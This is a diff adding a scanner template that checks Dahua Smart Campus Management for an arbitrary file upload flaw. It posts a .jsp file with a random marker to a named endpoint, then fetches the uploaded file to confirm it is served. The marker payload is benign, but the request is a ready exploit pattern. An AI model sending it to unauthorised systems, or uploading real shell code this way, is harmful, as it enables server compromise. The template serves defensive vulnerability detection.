@@ -1,0 +1,63 @@
+id: dahua-smart-campus-arbitrary-file-upload
+info:
+  name: Dahua Smart Campus Management Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,dahua
+  description: |
+    Detects arbitrary file upload vulnerability in Dahua Smart Campus Management platform.
+
+variables:
+  v1: "{{md5(rand_text_alphanumeric(8))}}"
+  boundary: "{{rand_text_alphanumeric(10)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/emap/devicePoint_addImgIco?hasSubsystem=true"
+    headers:
+      Content-Type: multipart/form-data; boundary={{boundary}}
+    body: |
+      --{{boundary}}\r\n
+      Content-Disposition: form-data; name="upload"; filename="123.jsp"\r\n
+      Content-Type: application/octet-stream\r\n
+      Content-Transfer-Encoding: binary\r\n\r\n
+      {{v1}}\r\n
+      --{{boundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":1,\"data\":\""
+    extractors:
+      - type: regex
+        name: fname
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "\"data\":\"(?P<fname>.*?)\""
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/emap/society_new/{{fname}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{v1}}"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
